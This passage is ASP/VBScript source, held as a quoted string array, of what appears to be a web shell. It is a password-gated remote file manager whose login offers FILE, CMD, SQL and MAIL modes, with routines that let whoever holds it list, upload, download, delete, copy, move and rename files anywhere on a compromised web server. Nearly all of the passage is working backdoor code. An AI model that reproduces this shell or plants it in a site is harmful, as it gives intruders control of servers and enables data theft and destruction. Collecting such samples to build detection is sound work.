            "body,td{font-family:Fixedsys}",
            "a{color:#0000ff}",
            "</style>",
            "</head>",
            "<body bgcolor=#000000 text=#ffffff>",
            "<p><%=path%>",
            "<table border=0 cellspacing=1 cellpadding=2 bgcolor=#ff0000>",
            "<tr bgcolor=#000000>",
            " <td><font color=#FFFF00>Name</font></td>",
            " <td align=center><font color=#FFFF00>Size</font></td>",
            " <td align=center><font color=#FFFF00>Ratio</font></td>",
            " <td align=center><font color=#FFFF00>Packed</font></td>",
            " <td align=center><font color=#FFFF00>Modify</font></td>",
            " <td align=center><font color=#FFFF00>Path</font></td>",
            "</tr>",
            "\tset zip=new clszip",
            "\tzip.ZipLoad(path)",
            "\tset zipfile=new clsZipFile",
            "\tfor i=1 to zip.FileCount",
            "\t\tset zipfile=zip.GetFile(i)",
            "\t\twith zipfile",
            "\t\t\tif not (.IsFolder Or .IsOverall) then",
            "\t\t\t\tResponse.Write \"<tr bgcolor=#000000>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td>\" & .Name & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td align=right>\" & FormatNumber(.Size,0) & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td align=right>\" & .Ratio & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td align=right>\" & FormatNumber(.Packed,0) & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td align=center>\" & FormatDate(.Modified) & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td>\" & .Path & \"</td>\" & vbNewLine",
            "\t\t\tend if",
            "\t\tend with",
            "\tnext",
            "\tset ZipFile=nothing",
            "\tset zip=nothing",
            "</table>",
            "</p>",
            "\tHtmlFooter()",
            "\tDestroy()",
            "end sub",
            "'###########################################################################################",
            "sub Delete()",
            "\tdim i,ndir,nfile,itemName,itemPath",
            "\ton error resume next",
            "\tndir=Request.Form(\"d\").Count",
            "\tnfile=Request.Form(\"f\").Count",
            "\tif (ndir>0) then",
            "\t\tgMsg=\"<b>D</b>elete folder(s)...\"",
            "\t\tfor i=1 to ndir",
            "\t\t\titemName=Request.Form(\"d\")(i)",
            "\t\t\titemPath=addslash(targetPath) & itemName",
            "\t\t\tFSO.DeleteFolder itemPath,true",
            "\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"",
            "\t\t\tif Err.Number<>0 then",
            "\t\t\t\tgMsg=gMsg & \"error\"",
            "\t\t\telse",
            "\t\t\t\tgMsg=gMsg & \"success\"",
            "\t\t\tend if",
            "\t\tnext",
            "\tend if",
            "\tif (nfile>0) then",
            "\t\tif (ndir>0) then gMsg= gMsg & \"<p>\" & vbNewLine",
            "\t\tgMsg=gMsg & \"<b>D</b>elete file(s)...\"",
            "\t\tfor i=1 to nfile",
            "\t\t\titemName=Request.Form(\"f\")(i)",
            "\t\t\titemPath=addslash(targetPath) & itemName",
            "\t\t\tFSO.DeleteFile itemPath,true",
            "\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"",
            "\t\t\tif Err.Number<>0 then",
            "\t\t\t\tgMsg=gMsg & \"error\"",
            "\t\t\telse",
            "\t\t\t\tgMsg=gMsg & \"success\"",
            "\t\t\tend if",
            "\t\tnext",
            "\tend if",
            "end sub",
            "'###########################################################################################",
            "sub Copy()",
            "\tdim i,nfile,ndir,itemName,itemPath",
            "\ton error resume next",
            "\tcp_dst=Trim(Request.Form(\"cp\"))",
            "\tif cp_dst=\"\" then exit sub",
            "\tcp_dst=abspath(cp_dst)",
            "\tSession(\"cp_dst\")=cp_dst",
            "\tif FSO.FolderExists(cp_dst)=false then",
            "\t\tgMsg=\"<p>Folder not exists\" & vbNewLine",
            "\t\texit sub",
            "\tend if",
            "\tndir=Request.Form(\"d\").Count",
            "\tnfile=Request.Form(\"f\").Count",
            "\tif (ndir>0) then",
            "\t\tgMsg=\"<b>C</b>opying folder(s) to \"\"\" & cp_dst & \"\"\" ...\"",
            "\t\tfor i=1 to ndir",
            "\t\t\titemName=Request.Form(\"d\")(i)",
            "\t\t\titemPath=addslash(targetPath) & itemName",
            "\t\t\tFSO.CopyFolder itemPath,addslash(cp_dst),true",
            "\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"",
            "\t\t\tif Err.Number<>0 then",
            "\t\t\t\tgMsg=gMsg & \"error\"",
            "\t\t\telse",
            "\t\t\t\tgMsg=gMsg & \"success\"",
            "\t\t\tend if",
            "\t\tnext",
            "\tend if",
            "\tif (nfile>0) then",
            "\t\tif (ndir>0) then gMsg= gMsg & \"<p>\" & vbNewLine",
            "\t\tgMsg=gMsg & \"<b>C</b>opying file(s) to \"\"\" & cp_dst & \"\"\" ...\"",
            "\t\tfor i=1 to nfile",
            "\t\t\titemName=Request.Form(\"f\")(i)",
            "\t\t\titemPath=addslash(targetPath) & itemName",
            "\t\t\tFSO.CopyFile itemPath,addslash(cp_dst),true",
            "\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"",
            "\t\t\tif Err.Number<>0 then gMsg=gMsg & \"error\" else gMsg=gMsg & \"success\"",
            "\t\tnext",
            "\tend if",
            "end sub",
            "'###########################################################################################",
            "sub Move()",
            "\tdim i,nfile,ndir,itemName,itemPath",
            "\ton error resume next",
            "\tmv_dst=Trim(Request.Form(\"mv\"))",
            "\tif mv_dst=\"\" then exit sub",
            "\tmv_dst=abspath(mv_dst)",
            "\tSession(\"mv_dst\")=mv_dst",
            "\tif FSO.FolderExists(mv_dst)=false then",
            "\t\tgMsg=\"<p>Folder not exists\" & vbNewLine",
            "\t\texit sub",
            "\tend if",
            "\tndir=Request.Form(\"d\").Count",
            "\tnfile=Request.Form(\"f\").Count",
            "\tif (ndir>0) then",
            "\t\tgMsg=\"<b>M</b>oving folder(s) to \"\"\" & mv_dst & \"\"\" ...\"",
            "\t\tfor i=1 to ndir",
            "\t\t\titemName=Request.Form(\"d\")(i)",
            "\t\t\titemPath=addslash(targetPath) & itemName",
            "\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"",
            "\t\t\tFSO.MoveFolder itemPath,addslash(mv_dst)",
            "\t\t\tif Err.Number<>0 then gMsg=gMsg & \"error\" else gMsg=gMsg & \"success\"",
            "\t\t\tset item=nothing",
            "\t\tnext",
            "\tend if",
            "\tif (nfile>0) then",
            "\t\tif (ndir>0) then gMsg= gMsg & \"<p>\" & vbNewLine",
            "\t\tgMsg=gMsg & \"<b>M</b>oving file(s) to \"\"\" & mv_dst & \"\"\" ...\"",
            "\t\tfor i=1 to nfile",
            "\t\t\titemName=Request.Form(\"f\")(i)",
            "\t\t\titemPath=addslash(targetPath) & itemName",
            "\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"",
            "\t\t\tFSO.MoveFile itemPath,addslash(mv_dst)",
            "\t\t\tif Err.Number<>0 then gMsg=gMsg & \"error\" else gMsg=gMsg & \"success\"",
            "\t\tnext",
            "\tend if",
            "end sub",
            "'###########################################################################################",
            "sub RenameItem()",
            "\tdim item,itemType,itemName,itemPath",
            "\tdim param,newName",
            "\titemType=request.form(\"command\")",
            "\tparam=split(request.form(\"param\"),\"|\")",
            "\titemName=param(0)",
            "\tnewName=param(1)",
            "\titemPath=addslash(targetPath) & newName",
            "\ton error resume next",
            "\tselect case itemType",
            "\t\tcase \"RenameFolder\"",
            "\t\t\tif (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then",
            "\t\t\t\titemPath=addslash(targetPath) & itemName",
            "\t\t\t\tset item=FSO.GetFolder(itemPath)",
            "\t\t\t\titem.Name=newName",
            "\t\t\t\tif Err.Number<>0 then",
            "\t\t\t\t\tgMsg=\"Unable to rename the folder \"\"\" & itemName & \"\"\", an error occured...\"",
            "\t\t\t\telse",
            "\t\t\t\t\tgMsg=\"Renamed the folder \"\"\" & itemName & \"\"\" to \"\"\" & newName & \"\"\"...\"",
            "\t\t\t\tend if",
            "\t\t\telse",
            "\t\t\t\tgMsg=\"Unable to rename the folder \"\"\" & itemName & \"\"\", there exists a file or a folder with the new name \"\"\" & newName & \"\"\"...\"",
            "\t\t\tend if",
            "\t\tcase \"RenameFile\"",
            "\t\t\tif (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then",
            "\t\t\t\titemPath=addslash(targetPath) & itemName",
            "\t\t\t\tset item=FSO.GetFile(itemPath)",
            "\t\t\t\titem.Name=newName",
            "\t\t\t\tif Err.Number<>0 then",
            "\t\t\t\t\tgMsg=\"Unable to rename the file \"\"\" & itemName & \"\"\", an error occured...\"",
            "\t\t\t\telse",
            "\t\t\t\t\tgMsg=\"Renamed the file \"\"\" & itemName & \"\"\" to \"\"\" & newName & \"\"\"...\"",
            "\t\t\t\tend if",
            "\t\t\telse",
            "\t\t\t\tgMsg=\"Unable to rename the file \"\"\" & itemName & \"\"\", there exists a file or a folder with the new name \"\"\" & newName & \"\"\"...\"",
            "\t\t\tend if",
            "\tend select",
            "\tset item=nothing",
            "end sub",
            "'###########################################################################################",
            "sub List()",
            "\tdim objFolder,folder,item,intCount,bOpen,ext,count",
            "\tif not FSO.FolderExists(targetPath) then",
            "\t\tgMsg=\"Folder not found\"",
            "\telse",
            "\t\ton error resume next",
            "\t\tset objFolder=FSO.GetFolder(targetPath)",
            "\t\tif Err.Number<>0 then",
            "\t\t\tgMsg=\"Can't open folder\"",
            "\t\telse",
            "\t\t\tintCount=objFolder.SubFolders.Count+objFolder.Files.Count",
            "\t\t\tif Err.Number<>0 then",
            "\t\t\t\tgMsg=\"Permission denied\"",
            "\t\t\telse",
            "<input type=button value=Refresh onclick=\"Command('Refresh')\">",
            "<input type=button value=\"New File\" onclick=\"Command('NewFile')\">",
            "<input type=button value=\"New Folder\" onclick=\"Command('NewFolder')\">",
            "<input type=button value=Upload onclick=\"frmUpload.max.focus()\">",
            "<input type=button value=Tree onclick=\"Command('Tree')\">",
            "\t\t\t\tbOpen=true",
            "\t\t\tend if",
            "\t\tend if",
            "\tend if",
            "\tHtmlQuick()",
            "\tif gMsg<>\"\" then Response.Write \"<p>\" & gMsg & vbNewLine",
            "\tif bOpen then",
            "\t\tcount=0",
            "\t\tif intCount>0 then Response.Write \"<p>\" & objFolder.SubFolders.Count & \" subfolder(s)<br>\" & vbNewLine & objFolder.Files.Count & \" file(s)<br>\" & vbNewLine",
            "\t\tif bSize then Response.Write \"(\" & FormatSize(objFolder.Size) & \")<br>\" & vbNewLine",
            "<table border=1 width=100%>",
            "<tr>",
            " <td><b>N</b>ame</td>",
            " <td align=center><b>S</b>ize</td>",
            " <td align=center><b>T</b>ype</td>",
            " <td align=center><b>M</b>odified</td>",
            " <td><b>A</b>ttributes</td>",
            " <td><b>A</b>ctions</td>",
            "<tr>",
            "\t\tif not isroot(targetPath) then",
            "<tr>",
            " <td><a href=\"javascript:Command('LevelRoot')\" title=\"Up Root Level\">\\</a></td>",
            " <td>&nbsp;</td>",
            " <td align=center>Root</td>",
            " <td>&nbsp;</td>",
            " <td>&nbsp;</td>",
            " <td>&nbsp;</td>",
            "</tr>",
            "<tr>",
            " <td><a href=\"javascript:Command('LevelUp')\" title=\"Up One level\">..</a></td>",
            " <td>&nbsp;</td>",
            " <td align=center>Up</td>",
            " <td>&nbsp;</td>",
            " <td>&nbsp;</td>",
            " <td>&nbsp;</td>",
            "</tr>",
            "\t\tend if",
            "\t\tif intCount>0 then",
            "\t\t\tHtmlJsForm()",
            "<form name=theForm method=post action=\"<%=gURL%>\">",
            "<input type=hidden name=command value=\"\">",
            "<input type=hidden name=folder value=\"<%=targetPath%>\">",
            "\t\t\tfor each item in objFolder.SubFolders",
            "\t\t\t\tcount=count+1",
            "\t\t\t\tResponse.Write \"<tr>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td><a href=\"\"javascript:Command('OpenFolder',&#34;\" & item.Name & \"&#34;)\"\"\" ",
            "\t\t\t\tif Len(item.Name)>gMax then Response.Write \" title=\"\"\" & item.Name & \"\"\"\"",
            "\t\t\t\tResponse.Write \">\" & FormatName(item.Name) & \"</a></td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td align=right>&nbsp;</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td align=center>DIR</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td align=center>\" & FormatDate(item.DateLastModified ) & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td>\" & GetAttributes(item.Attributes) & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td><input type=checkbox name=d value=\"\"\" & item.Name & \"\"\"><input type=button value=Ren onclick=\"\"Command('RenameFolder',&#34;\" & item.Name & \"&#34;)\"\"><input type=button value=Attr onclick=\"\"Command('ChangeAttributesFolder',&#34;\" & item.Name & \"&#34;)\"\"></td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \"</tr>\" & vbNewLine",
            "\t\t\tnext",
            "\t\t\tfor each item in objFolder.Files",
            "\t\t\t\tcount=count+1",
            "\t\t\t\tResponse.Write \"<tr>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td><a href=\"\"javascript:Command('Download',&#34;\" & item.Name & \"&#34)\"\"\"",
            "\t\t\t\text=FSO.GetExtensionName(addslash(targetPath) & item.Name)",
            "\t\t\t\tre.IgnoreCase = true",
            "\t\t\t\tre.Pattern = \"^\" & ext & \",|,\" & ext & \",|,\" & ext & \"$\"",
            "\t\t\t\tif re.Test(lnkExt) then",
            "\t\t\t\t\tResponse.Write \" title=\"\"-&gt; \" & Server.Htmlencode(FindLink(addslash(targetPath) & item.Name)) & \"\"\"\"",
            "\t\t\t\telseif Len(item.Name)>gMax then",
            "\t\t\t\t\tResponse.Write \" title=\"\"\" & item.Name & \"\"\"\"",
            "\t\t\t\tend if",
            "\t\t\t\tResponse.Write \">\" & FormatName(item.Name) & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td align=right>\" & FormatSize(item.Size) & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td align=center>\" & item.Type & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td align=center>\" & FormatDate(item.DateLastModified ) & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td>\" & GetAttributes(item.Attributes) & \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \" <td><input type=checkbox name=f value=\"\"\" & item.Name & \"\"\"><input type=button value=Ren onclick=\"\"Command('RenameFile',&#34;\" & item.Name & \"&#34;)\"\"><input type=button value=Attr onclick=\"\"Command('ChangeAttributesFile',&#34;\" & item.Name & \"&#34;)\"\">\"",
            "\t\t\t\tif re.Test(editExt) then",
            "\t\t\t\t\tResponse.Write \"<input type=button value=Edit onclick=\"\"Command('Edit',&#34;\" & item.Name & \"&#34;)\"\">\"",
            "\t\t\t\tend if",
            "\t\t\t\t",
            "\t\t\t\tif Lcase(ext)=\"zip\" then",
            "\t\t\t\t\tResponse.Write \"<input type=button value=Info onclick=\"\"Command('ZipInfo',&#34;\" & item.Name & \"&#34;)\"\">\"",
            "\t\t\t\tend if",
            "\t\t\t\tResponse.Write \"</td>\" & vbNewLine",
            "\t\t\t\tResponse.Write \"</tr>\" & vbNewLine",
            "\t\t\tnext",
            "\t\t\tif count>0 then",
            "<tr>",
            " <td>&nbsp;</td>",
            " <td>&nbsp;</td>",
            " <td>&nbsp;</td>",
            " <td>&nbsp;</td>",
            " <td>&nbsp;</td>",
            " <td><input type=checkbox name=allbox title=\"Select All\" onclick=\"CheckAll()\"><input type=button value=Delete title=\"Delete Selected Item(s)\" onclick=\"DoWork('Delete')\"></td>",
            "</tr>",
            "\t\t\tend if",
            "</table>",
            "\t\tif count>1 then",
            "<table>",
            "<tr><td><b>C</b>opy selected item(s) to</td><td><input type=text name=cp value=\"<%=Session(\"cp_dst\")%>\" size=50 onkeydown=\" if (event.keyCode==13) theForm.cp_bt.click();\"> <input type=button id=cp_bt value=Copy onclick=\"DoWork('Copy')\"></td></tr>",
            "<tr><td><b>M</b>ove selected item(s) to</td><td><input type=text name=mv value=\"<%=Session(\"mv_dst\")%>\" size=50 onkeydown=\" if (event.keyCode==13) theForm.mv_bt.click();\"> <input type=\"button\" id=mv_bt value=Move onclick=\"DoWork('Move')\"></td></tr>",
            "</table>",
            "\tend if",
            "</form>",
            "</table>",
            "\t\tend if",
            "\t\tset objFolder=nothing",
            "<p><b>U</b>pload file(s) to \"<%=targetPath%>\"",
            "<form name=frmUpload method=post enctype=\"multipart/form-data\" action=\"<%=gURL%>\">",
            "<input type=hidden name=folder value=\"<%=targetPath%>\">",
            "Max: <input type=text name=max value=5 size=5> <input type=button value=# onclick=\"setid()\"><br>",
            "<table>",
            "<tr>",
            "<td id=upid>",
            "</td>",
            "</tr>",
            "</table>",
            "<input type=submit value=Upload>",
            "</form>",
            "<script>",
            "setid();",
            "function setid() {",
            "\tstr='<br>';",
            "\tif (frmUpload.max.value<=0) frmUpload.max.value=1;",
            "\tfor (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';",
            "\tupid.innerHTML=str+'<br>';",
            "</script>",
            "\tend if",
            "<form name=frmFile method=post action=\"<%=gURL%>\">",
            "<input type=hidden name=command value=\"\">",
            "<input type=hidden name=param value=\"\">",
            "<input type=hidden name=folder value=\"<%=targetPath%>\">",
            "</form>",
            "<script>frmAddress.param.focus()</script>",
            "\tHtmlJsCommand()",
            "end sub",
            "'###########################################################################################",
            "sub Upload()",
            "\tdim objUpload,f,max,i,name,path,size,success",
            "\tHtmlHeader(\"\")",
            "\tHtmlMode()",
            "\tset objUpload=New clsUpload",
            "\ttargetPath=objUpload.Fields(\"folder\").Value",
            "\tmax=objUpload.Fields(\"max\").Value",
            "\tgMsg= \"<b>U</b>pload...\" & vbNewLine",
            "\tfor i=1 to max",
            "\t\tname=objUpload.Fields(\"file\" & i).FileName",
            "\t\tsize=objUpload.Fields(\"file\" & i).Length",
            "\t\tif (name<>\"\") and (size>0) then",
            "\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & name & \" (\" & FormatNumber(size,0) & \" bytes): \"",
            "\t\t\tpath=addslash(targetPath) & name",
            "\t\t\tobjUpload.Fields(\"file\" & i).SaveAs path",
            "\t\t\tif FSO.FileExists(path) then",
            "\t\t\t\ton error resume next",
            "\t\t\t\tset f=FSO.GetFile(path)",
            "\t\t\t\tif IsObject(f) then",
            "\t\t\t\t\tif f.Size=size then success=true else success=false",
            "\t\t\t\tend if",
            "\t\t\t\tset f=nothing",
            "\t\t\tend if",
            "\t\t\tif success then  gMsg=gMsg & \"success\" else gMsg = gMsg & \"fail\"",
            "\t\tend if",
            "\tnext",
            "\tset objUpload=nothing",
            "\tList()",
            "\tHtmlFooter()",
            "\tDestroy()",
            "end sub",
            "'###########################################################################################",
            "sub Download()",
            "\tdim oStream",
            "\tdim szFileName",
            "\tszFileName=addslash(Request.Form(\"folder\")) & Request.form(\"Param\")",
            "\tif FSO.FileExists(szFileName) then",
            "\t\tset oStream=Server.CreateObject(\"ADODB.Stream\")",
            "\t\toStream.Type=1",
            "\t\toStream.Open",
            "\t\ton error resume next",
            "\t\toStream.LoadFromFile(szFileName)",
            "\t\tif Err.Number=0 then",
            "\t\t\tResponse.AddHeader \"Content-Disposition\", \"attachment; filename=\" & FSO.GetFileName(szFileName)",
            "\t\t\tResponse.AddHeader \"Content-Length\", oStream.Size",
            "\t\t\tResponse.ContentType=\"bad/type\" 'yeu cau ie hien hop thoai save-as",
            "\t\t\tResponse.BinaryWrite oStream.Read",
            "\t\tend if",
            "\t\toStream.Close",
            "\t\tset oStream=nothing",
            "\tend if",
            "\tDestroy()",
            "end sub",
            "'###########################################################################################",
            "sub Logout()",
            "\tSession.Abandon",
            "\tResponse.Redirect gURL",
            "\tDestroy()",
            "end sub",
            "sub Init()",
            "\tSession(\"switch\")=false",
            "\tset FSO=Server.CreateObject(\"Scripting.FileSystemObject\")",
            "\tset re=new regexp",
            "end sub",
            "sub Destroy()",
            "\tset FSO=nothing",
            "\tset re=nothing",
            "\tResponse.End",
            "end sub",
            "'###########################################################################################",
            "sub Secure()",
            "\tif (Session(\"allow\")=1) then exit sub",
            "\tif (gPassword=\"\") then",
            "\t\tSession(\"allow\")=1",
            "\t\tSession(\"mode\")=0",
            "\t\texit sub",
            "\tend if",
            "\tif (Request.Form(\"command\")=\"Login\") then",
            "\t\tif Request.Form(\"password\")=gPassword then",
            "\t\t\tSession(\"allow\")=1",
            "\t\t\tSession(\"mode\")=CInt(Request.Form(\"mode\"))",
            "\t\t\texit sub",
            "\t\tend if",
            "\tend if",
            "\tHtmlHeader(\"\")",
            "<form name=frmLogin method=post action=\"<%=gURL%>\">",
            "<table>",
            "<tr>",
            " <td><b>M</b>ode:</td>",
            " <td>",
            "  <select name=mode>",
            "   <option value=0 selected>FILE",
            "   <option value=1>CMD",
            "   <option value=2>SQL",
            "   <option value=3>MAIL",
            "  </select>",
            " </td>",
            "</tr>",
            "<tr>",
            " <td><b>P</b>assword:</td>",
            " <td><input type=password name=password></td>",
            "</tr>",
            "<tr>",
            " <td colspan=2><input type=submit name=command value=Login></td>",
            "</tr>",
            "</table>",
            "</form>",
            "<script>frmLogin.password.focus()</script>",
            "\tHtmlFooter()",
            "\tDestroy()",
            "end sub",
            "'###########################################################################################",
            "sub HtmlJsForm()",
            "<script>",
            "function CheckAll() {",
            "\tvar fmobj=document.theForm;",
            "\tfor (var i=0; i<fmobj.elements.length;i++) {",
            "\t\tvar e=fmobj.elements[i];",
            "\t\tif ((e.name!='allbox') && (e.type=='checkbox') && (!e.disabled)) {",
            "\t\t\te.checked=fmobj.allbox.checked;",
            "\tif (fmobj.allbox.checked) {",
            "\t\tfmobj.allbox.title='Clear All';",
            "\t} else {",
            "\t\tfmobj.allbox.title='Select All';",
            "function DoWork(cmd) {",
            "\tvar s;",
            "\tvar fmobj=document.theForm;",
            "\tvar total=0;",
            "\tfor (var i=0; i<fmobj.elements.length; i++) {",
            "\t\tvar e=fmobj.elements[i];",
            "\t\tif ((e.name!='allbox') && (e.type=='checkbox') && (e.checked)) total++;",
            "\tif (total<1) return;",
            "\ts=(total>1)?'s':'';",
            "\tswitch (cmd) {",
            "\t\tcase \"Delete\":",
            "\t\t\tif (!confirm('Are you sure to delete ' + total + ' selected item' + s + ' ?')) return;",
            "\t\t\tbreak;",
            "\t\tcase \"Move\":",
            "\t\t\tvar mv=fmobj.mv.value;",
            "\t\t\tvar re1=/^\\s*[A-Z]{1}:[^\\\"\\*\\?\\<\\>\\|]*\\s*$/gi;",
            "\t\t\tvar re2=/^\\s*:{1}[^\\s]+/gi;",
            "\t\t\tif (mv=='') return;",
            "\t\t\tif ( re1.test(mv) || re2.test(mv) ){",
            "\t\t\t\tif (!confirm('Are you sure to move ' + total + ' selected item' + s + ' to \"' + mv + '\" ?')) return;",
            "\t\t\t} else {",
            "\t\t\t\talert('Invalid path name !');",
            "\t\t\t\treturn;",
            "\t\t\t}",
            "\t\t\tbreak;",
            "\t\tcase \"Copy\":",
            "\t\t\tvar cp=fmobj.cp.value;",
            "\t\t\tvar re1=/^\\s*[A-Z]{1}:[^\\\"\\*\\?\\<\\>\\|]*\\s*$/gi;",
            "\t\t\tvar re2=/^\\s*:{1}[^\\s]+/gi;",
            "\t\t\tif (cp=='') return;",
            "\t\t\tif ( re1.test(cp) || re2.test(cp) ) {",
            "\t\t\t} else {",
            "\t\t\t\talert('Invalid path name !');",
            "\t\t\t\treturn;",
            "\t\t\t}",
            "\t\t\tbreak;",
            "\t\tdefault:",
            "\t\t\treturn;",
            "\tfmobj.command.value=cmd;",
            "\tfmobj.submit();",
            "</script>",
            "end sub",
            "'###########################################################################################",
            "sub HtmlJsCommand()",
            "<script>",
            "\tfunction openWin(winName, urlLoc, w, h, showStatus, isViewer) {",
            "\t\tl = (screen.availWidth - w)/2;",
            "\t\tt = (screen.availHeight - h)/2;",
            "\t\tfeatures  = \"toolbar=no\";      // yes|no ",
            "\t\tfeatures += \",location=no\";    // yes|no ",
            "\t\tfeatures += \",directories=no\"; // yes|no ",
            "\t\tfeatures += \",status=\" + (showStatus?\"yes\":\"no\");  // yes|no ",
            "\t\tfeatures += \",menubar=no\";     // yes|no ",
            "\t\tfeatures += \",scrollbars=\" + (isViewer?\"yes\":\"no\");   // auto|yes|no ",
            "\t\tfeatures += \",resizable=\" + (isViewer?\"yes\":\"no\");   // yes|no ",
            "\t\tfeatures += \",dependent\";      // close the parent, close the popup, omit if you want otherwise ",
            "\t\tfeatures += \",height=\" + h;",
            "\t\tfeatures += \",width=\" + w;",
            "\t\tfeatures += \",left=\" + l;",
            "\t\tfeatures += \",top=\" + t;",
            "\t\twinName = winName.replace(/[^a-z]/gi,\"_\");",
            "\t\treturn window.open(urlLoc,winName,features);",
            "\tfunction createPage (theWin, cmd, param){",
            "\t\tfrmFile.target = theWin.name;",
            "\t\tfrmFile.command.value = cmd;",
            "\t\tfrmFile.param.value = param;",
            "\t\tfrmFile.submit();",
            "\tfunction CheckName(str) {",
            "\t\tvar re;",
            "\t\tre = /[\\\\/:*?\"<>|]/gi;",
            "\t\tif (re.test(str)) return false;\t",
            "\t\telse return true;",
            "\tfunction Command(cmd, param) {",
            "\t\tvar str;",
            "\t\tvar someWin;",
            "\t\tswitch (cmd) {",
            "\t\t\tcase \"Tree\":",
            "\t\t\t\tstr = prompt(\"Please enter a name for the folder to tree\", frmFile.folder.value);",
            "\t\t\t\tif (!str) return;",
            "\t\t\t\tvar re1=/^\\s*[A-Z]{1}:[^\\\"\\*\\?\\<\\>\\|]*\\s*$/gi;",
            "\t\t\t\tvar re2=/^\\s*:{1}[^\\s]+/gi;",
            "\t\t\t\tif (re1.test(str) || re2.test(str)) {",
            "\t\t\t\t\tvar winName=cmd + document.forms.frmFile.param.value;",
            "\t\t\t\t\tparam=str;",
            "\t\t\t\t\tdocument.forms.frmFile.param.value=param;",
            "\t\t\t\t\twinName=winName.replace(/[^a-z]/gi,\"_\");",
            "\t\t\t\t\tsomeWin=window.open(\"\", winName, \"toolbar=yes,location=no,directories=no,status=yes,menubar=yes,scrollbars=yes,resizable=yes\");",
            "\t\t\t\t\tsomeWin.focus();",
            "\t\t\t\t\tcreatePage(someWin,cmd,param);",
            "\t\t\t\t\tsomeWin = null;",
            "\t\t\t\t\treturn;",
            "\t\t\t\t}",
            "\t\t\t\telse {",
            "\t\t\t\t\talert('Invalid path name !');",
            "\t\t\t\t\treturn;",
            "\t\t\t\t}",
            "\t\t\t\tbreak;",
            "\t\t\tcase \"NewFile\":",
            "\t\t\t\tstr = prompt(\"Please enter a name for the new file\", \"New File\");",
            "\t\t\t\tif(!str) return;",
            "\t\t\t\telse if (!CheckName(str)) {alert(\"File name can not contain any of the\\nfollowing characters: \\\\ / : * ? \\\" < > |\"); return;}",
            "\t\t\t\tfrmFile.param.value = str;",
            "\t\t\t\tbreak;",
            "\t\t\tcase \"NewFolder\":",
            "\t\t\t\tstr = prompt(\"Please enter a name for the new folder\", \"New Folder\");",
            "\t\t\t\tif(!str) return;",
            "\t\t\t\telse if (!CheckName(str)) {alert(\"Folder name can not contain any of the\\nfollowing characters: \\\\ / : * ? \\\" < > |\"); return;}",
            "\t\t\t\tfrmFile.param.value = str;",
            "\t\t\t\tbreak;",
            "\t\t\t\t\t\tcase \"RenameFile\":",
            "\t\t\t\tstr = prompt(\"Please enter the new name for the file\", param);",
            "\t\t\t\tif (!str || (str==param)) return;",
            "\t\t\t\telse if (!CheckName(str)) {alert(\"File name can not contain any of the\\nfollowing characters: \\\\ / : * ? \\\" < > |\"); return;}",
            "\t\t\t\tfrmFile.param.value = param + \"|\" + str;",
            "\t\t\t\tbreak;",
            "\t\t\tcase \"RenameFolder\":",
            "\t\t\t\tstr = prompt(\"Please enter the new name for the folder\", param);",
            "\t\t\t\tif (!str || (str==param)) return;",
            "\t\t\t\telse if (!CheckName(str)) {alert(\"Folder name can not contain any of the\\nfollowing characters: \\\\ / : * ? \\\" < > |\"); return;}",
            "\t\t\t\tfrmFile.param.value = param + \"|\" + str;",
            "\t\t\t\tbreak;",
            "\t\t\tcase \"Edit\":",
            "\t\t\t\tstr = frmFile.folder.value + param;",
            "\t\t\t\tsomeWin = openWin(cmd + str, \"\", 600, 440, true, false);",
            "\t\t\t\tsomeWin.focus();",
            "\t\t\t\tcreatePage(someWin,cmd,param);",
            "\t\t\t\tsomeWin = null;",
            "\t\t\t\treturn;",
            "\t\t\t\tbreak;",
            "\t\t\tcase \"ChangeAttributesFile\":",
            "\t\t\tcase \"ChangeAttributesFolder\":",
            "\t\t\t\tstr = frmFile.folder.value + param;",
            "\t\t\t\tsomeWin = openWin(cmd + str, \"\", 300, 160, true, false);",
            "\t\t\t\tsomeWin.focus();",
            "\t\t\t\tcreatePage(someWin,cmd,param);",
            "\t\t\t\tsomeWin = null;",
            "\t\t\t\treturn;",
            "\t\t\t\tbreak;",
            "\t\t\tcase \"ZipInfo\":",
            "\t\t\t\tvar winName=cmd + document.forms.frmFile.folder.value + param;",
            "\t\t\t\twinName=winName.replace(/[^a-z]/gi,\"_\");",
            "\t\t\t\tsomeWin=window.open(\"\", winName, \"toolbar=yes,location=no,directories=no,status=yes,menubar=yes,scrollbars=yes,resizable=yes\");",
            "\t\t\t\tsomeWin.focus();",
            "\t\t\t\tcreatePage(someWin,cmd,param);",
            "\t\t\t\tsomeWin = null;",
            "\t\t\t\treturn;",
            "\t\t\t\tbreak",
            "\t\t\tdefault:",
            "\t\t\t\tfrmFile.param.value = param;",
